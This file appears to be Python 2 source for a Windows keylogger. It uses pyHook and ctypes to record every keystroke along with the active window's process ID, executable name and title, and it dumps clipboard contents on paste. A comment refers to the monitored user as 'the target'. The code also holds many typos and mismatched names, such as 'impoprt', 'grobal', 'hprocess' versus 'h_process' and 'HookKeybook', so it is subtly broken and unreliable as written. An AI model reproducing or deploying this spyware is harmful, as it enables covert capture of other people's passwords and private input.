#

from ctypes import *
impoprt pythoncom
import pyHook
import win32clipboard


user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
	
	hwnd = user32.GetForegroundWindow()

	#get threading ID
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd,byref(pid))

	#save processing threading Id
	process_id = "%d" % pid.value

	#
	executable = create_string_buffer("\x00" * 512)

	hprocess = kernel32.OpenProcess(0x400 | 0x10,False,pid)

	psapi.GetModelBaseNameA(h_process,None,byref(executable),512)

	# Read the title of window
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd,byref(window_title),512)

	#output
	print
	print "[PID:%s-%s-%s]" % (process_id,executable.value,window_title.value)
	print

	#close handle
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)


def KeyStroke(event):

	grobal current_window

	#check to see whether the target changed the window
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process()

	# If they press a standard key
	if event.Ascii > 32 and event.Ascii < 127:
		print chr(event.ascii),
	else:
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboarddata()
			win32clipboard.CloseClipboard()
			print "[PASTE] - %s" % (pasted_value),
		else:
			print "[%s]" % event.Key,

	#pass execution to next hook registered
	return True

# creat and register a hook manager
k1 = pyHook.HookManager()
k1.KeyDown = KeyStroke

# register the hook and execute forever
k1.HookKeybook()
pythoncom.PumpMessages()





